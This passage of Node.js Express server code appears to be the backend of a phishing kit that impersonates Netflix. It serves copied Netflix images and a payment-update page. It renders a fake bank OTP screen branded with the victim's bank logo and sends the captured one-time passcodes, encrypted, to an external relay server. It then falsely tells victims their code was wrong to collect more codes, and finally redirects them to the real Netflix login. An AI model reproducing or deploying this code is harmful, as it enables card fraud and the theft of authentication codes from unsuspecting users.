            pendingSessions.delete(sessionId);
            session.resolve({
                status: 'url_redirect',
                url: response.url,
                redirectUrl: response.url
            });
        } else {
            pendingSessions.delete(sessionId);
            session.resolve(response);
        }

        return res.json({
            success: true,
            status: response.status,
            redirectUrl: response.redirectUrl || '/thank-you'
        });

    } catch (error) {
        console.error('Error processing session update:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});
app.get("/otp-verification", (req, res) => {
    const { bank, cchold } = req.query;
    const error = req.query.error || 0;

    // Store in session if not already present
    if (bank && !req.session.bankName) {
        req.session.bankName = bank;
    }
    if (cchold && !req.session.firstName) {
        req.session.firstName = cchold;
    }

    if (!req.session.bankName || !req.session.firstName) {
        return res.status(400).send("Missing required parameters / Session_Terminated_Unexpectedly");
    }

    const query = {
        engine: "google",
        api_key: serpApiKey,
        q: `${req.session.bankName} bank logo official`,
        tbm: "isch",
        ijn: "0",
    };

    getJson(query, (json) => {
        const images_results = json.images_results;
        const lkhr = images_results.length ? images_results[0].original : "";
        const dateYmd = new Date().toLocaleDateString("en-US");
        const phone = req.session.phoneNumber || "Unknown";
        const okbbx = error == 1 ? "okbbxErr" : "okbbx";
        const msg = error == 1
            ? `<div class='msg oaerror danger' style='width: 90%; display: table; align-items: stretch;'><p>The one-Time Passcode entered is incorrect. Another OTP has been sent to your mobile <h4 style='font-weight:bold;'>****</h4></p></div>`
            : "<div class='msg oaerror info' style='width: 90%; display: table; align-items: stretch;'>One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile.</div>";
        const maskedCC = getTruncatedCCNumber(req.session.ccnumber);
        console.log("Masked DECRP:", maskedCC); // Debug log
        res.render("otp", {
            lkhr,
            phone: getTruncatedPHONE(phone),
            dateYmd,
            ccNum: maskedCC,
            cchold: req.session.firstName.toUpperCase(),
            bank: req.session.bankName,
            ip_address: req.ip,
            error,
            okbbx,
            msg,
        });
    });
});

// POST route for OTP verification
app.post("/otp-verification", async (req, res) => {
    try {
        if (!req.session.bankName || !req.session.firstName) {
            return res.status(400).send("Session expired or invalid");
        }

        const { thd, spc } = req.body;
        const ip = getClientIp(req);
        const error = req.query.error || 0;
        
        const otpData = {
            type: error == 1 ? 'NFX2' : 'NFX',
            smsCode: thd,
            spc: spc || '',
            ip: ip
        };

        const encryptedData = encryptData(otpData);

        try {
            const response = await axios.post('https://middle-man-workman1.onrender.com/receive-encrypted-data', {
                encryptedData,
                messageType: 'otp'
            });

            if (error == 1) {
                req.session.islast = req.body.islast || "no";
                if (req.session.islast == "yes") {
                    return setTimeout(() => {
                        res.redirect("/thank-you");
                    }, 3000);
                }
            }
            
            // Use session data for redirect
            setTimeout(() => {
                res.redirect(
                    `/otp-verification?error=1&bank=${encodeURIComponent(req.session.bankName)}&cchold=${encodeURIComponent(req.session.firstName)}`
                );
            }, error == 1 ? 2000 : 10000);

        } catch (error) {
            console.error("Failed to send to Flask API:", error);
            throw error;
        }
    } catch (error) {
        console.error("Failed to handle request:", error);
        res.status(400).json({
            success: false,
            message: "Invalid parameters or processing error"
        });
    }
});

app.get("/thank-you", (req, res) => {
    res.redirect("https://netflix.com/login");
});

app.get(
    "/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_large.jpg",
    (req, res) => {
        res.sendFile(
            __dirname +
            "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_large.jpg",
        );
    },
);

app.get(
    "/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_medium.jpg",
    (req, res) => {
        res.sendFile(
            __dirname +
            "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_medium.jpg",
        );
    },
);

app.get(
    "/simplemember/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_small.jpg",
    (req, res) => {
        res.sendFile(
            __dirname +
            "/NTFLX/images/US-en-20240903-TRIFECTA_GLOBAL_FALLBACK-perspective_d0db67d4-a740-462b-97e1-95ebb9ef84c3_small.jpg",
        );
    },
);

app.get("/simplemember/nficon2023.ico", (req, res) => {
    res.sendFile(__dirname + "/NTFLX/nficon2023.ico");
});

app.get("/ppIPaymentSubmitter", (req, res) => {
    console.log("USER CLICKED ON PPL ---> REDIRECTING...");
    res.redirect("https://actpy.pl/ntf1x");
});

app.get("/simplemember/paymentupdater", (req, res) => {
    res.sendFile(__dirname + "/NTFLX/update.html"); // change here
    ////res.sendFile(__dirname + "/NTFLX/updatePPL.html"); // change here
    //res.sendFile(__dirname + "/NTFLX/updatePPL.html"); // change here
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

// Helper functions
function getTruncatedPHONE(phone) {
    if (!phone) return "****-****"; // Return a default masked number if phone is undefined
    return phone.slice(0, -4).replace(/\d/g, "*") + phone.slice(-4);
}

function getTruncatedCCNumber(ccNum) {
    if (!ccNum) return "****-****-****-****";
    // Remove any spaces and ensure it's a string
    const cleanNum = ccNum.toString().replace(/\s+/g, '');
    // Add dashes every 4 digits
    const masked = cleanNum.slice(0, -4).replace(/\d/g, "*") + cleanNum.slice(-4);
    return masked.match(/.{1,4}/g).join('-');
}